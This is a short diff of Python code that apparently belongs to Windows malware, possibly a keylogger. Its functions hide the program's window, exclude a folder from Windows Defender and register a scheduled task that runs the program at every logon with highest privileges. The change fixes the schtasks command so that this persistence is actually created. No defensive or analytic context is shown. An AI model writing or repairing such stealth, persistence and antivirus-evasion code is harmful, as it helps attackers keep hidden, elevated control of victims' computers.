@@ -22,7 +22,7 @@ def hide_window():
     ShowWindow(window, 0)
 
 def setup_task():
-    run(['schtasks', '/run', '/tn', 'Log', '/tr', f'"{filepath}"', '/sc', 'onlogon', '/rl', 'highest'])
+    run(['schtasks', '/create', '/tn', 'Log', '/tr', f'"{filepath}"', '/sc', 'onlogon', '/rl', 'highest'])
 
 def defender_ignore(folderpath):
     create_folder(folderpath)
